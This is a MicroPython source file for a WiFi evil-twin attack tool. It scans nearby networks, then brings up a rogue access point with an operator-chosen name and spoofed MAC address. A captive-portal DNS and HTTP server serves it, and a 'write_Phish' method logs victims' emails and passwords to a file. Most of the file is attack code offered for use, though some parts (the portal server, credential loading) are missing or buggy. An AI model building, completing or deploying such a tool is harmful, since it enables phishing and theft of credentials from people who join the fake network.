import network  
import binascii
import uerrno
import uos 
import time
import gc
import uselect as select
from captive_dns import DNSServer
from server import HTTPServer

Network_Creds = "creds.txt"
Pass_Logs     = "logs.txt"

class CaptivePortal:

    AP_IP = "192.168.4.1"

    def __init__(self):
        self.sta_if = network.WLAN(network.STA_IF)
        self.ap_if = network.WLAN(network.AP_IF)
        self.email = None
        self.password = None
        self.dns_server  =  None
        self.http_server =  None
        self.poller = select.poll()
        

        
    def start(self):
        self.sta_if.active(True)
        self.connect()
         

    def connect(self):
        # check if Network credential file exists 
        if Network_Creds in uos.listdir():
            file = open(Network_Creds, 'r')
            ssid = file.readline().rstrip('\n')
            password = file.readline().rstrip('\n')
            file.close()
            print("Network-SSID: ", ssid + "\n")
            print("Network-Password: ", password)
            self.sta_if.connect(ssid, password)
            print ("Please wait While the Script scans for Nearby WIFI Networks........")
            time.sleep(.5)
            self.scan_and_print_networks()

        else:
            # if the FILE does not exist, ask the user to input one
            ssid = input("Enter your Network SSID: ")
            password = input("Enter your Password: ")
            file = open(Network_Creds, 'w')
            file.write(ssid + "\n" + password + "\n")  # Save on separate lines
            file.close()
            print ("User inputs stored in the file.")
            print ("Pleae wait While the Script scans for Nearby WIFI Networks........")
            time.sleep(.5)
            self.scan_and_print_networks() 
            

    def scan(self):
        self.sta_if.active(True)
        networks = self.sta_if.scan()
        return networks

    def scan_and_print_networks(self):
        networks = self.scan()
        print("Nearby WiFi networks:")
        for network_info in networks:
            ssid = network_info[0].decode()
            bssid = ":".join("{:02x}".format(b) for b in network_info[1])
            channel = network_info[2]
            rssi = network_info[3]
            security = network_info[4]
            hidden = network_info[5]
            security_types = {
                0: "Open",
                1: "WEP",
                2: "WPA-PSK",
                3: "WPA2-PSK",
                4: "WPA/WPA2-PSK"
            }
            hidden_types = {
                0: "Visible",
                1: "Hidden"
            }
            print("_______________________________________________")
            print("|___SSID: %s" % ssid)
            print("|___BSSID: %s" % bssid)
            print("|___Channel: %d" % channel)
            print("|___RSSI: %d" % rssi)
            print("|___Security: %s" % security_types.get(security, "Unknown"))
            print("|___Hidden: %s" % hidden_types.get(hidden, "Unknown"))
            print("_______________________________________________")
            
            rescan =input("Would you like to Take a scan Again??(Y/N) ")

            if rescan.startswith("y" or "Y"):
                self.scan_and_print_networks() 
                print ("[WIFI] Network Rescan Started ")
        else:
            self.rogue_ap()


   
    def rogue_ap(self):
     self.local_ip = self.AP_IP
    
     #essid_list = []
    
     #num_rogue_ap = int(input("Enter the number of Rogue AP you would like to create: ")) 
    
     secmode = input("[?]Would You Like To Enable encryption? (0 = Open / 4 = WPA-2PSK) ")
     if secmode.isdigit():
        authmodes = int(secmode)
        self.authmodes = authmodes

     essid = input("please enter a name for your Rouge AP: ")
     user_mac = input("Enter the MAC address (format: xx:xx:xx:xx:xx:xx): ")

     self.user_mac_encoded = binascii.unhexlify(''.join(i for i in user_mac.split(':')))

     #self.bssid = user_mac_encoded 
     self.essid = essid
     self.start_rogue_ap()
     #self.staions_stats()
     if self.http_server is None:
        self.http_server = HTTPServer(self.poller, self.local_ip)
        print ("[HTTP] Server has been configured")
     if self.dns_server is None:
        self.dns_server = DNSServer(self.poller, self.local_ip)
        print ("DNS Server has been configured")

     try:
        while True:
            gc.collect()
            #check for socket events and handle them
            for response in self.poller.ipoll(1000):
                sock, event, *others = response
                is_handled = self.handle_dns(sock, event, others)
                if not is_handled:
                 self.handle_http(sock, event, others)

            #if_self.check_valid_wifi():
                #print("htg")    
     except KeyboardInterrupt:

        print ("Rogue APs Has Been Stopped")
        self.cleanup


    def handle_http(self, sock, event, others):
        self.http_server.handle(sock, event, others)


    def handle_dns(self, sock, event, others):
        if sock is self.dns_server.sock:
            # ignore UDP socket hangup
            if event == select.POLLHUP:
                return True
            self.dns_server.handle(sock, event, others)
            return True
        return False


    def cleanup(self):
        print ("Cleaning up") 
        if self.dns_server:
            self.dns_server.stop(self.poller)
        gc.collect()                              
   
    def write_Phish(self, email, password):
        open(self.Pass_Logs, 'wb').write(b','.join([email, password])) 
        print("Wrote credentials to {:s}".format(self.Pass_Logs))
        self.creds.load()
        
    def read_from_file(self):
        if self.creds.load().is_valid():
            return True 



    def start_rogue_ap(self):
     self.ap_if.active(False)
     while not self.ap_if.active():
        print("Starting Rogue AP.......")
        self.ap_if.active(True)
        time.sleep(1)
        self.ap_if.ifconfig((self.local_ip, "255.255.255.0", self.local_ip, self.local_ip))

     self.ap_if.config(essid=self.essid, authmode=self.authmodes, mac=self.user_mac_encoded)
     print("AP mode configured:", self.ap_if.ifconfig())


    def has_creds(self):
        self.email, self.password = self.http_server.saved_credentials
        return None not in self.http_server.saved_credentials


    #def check_valid_login():
        #if self.has_creds():

 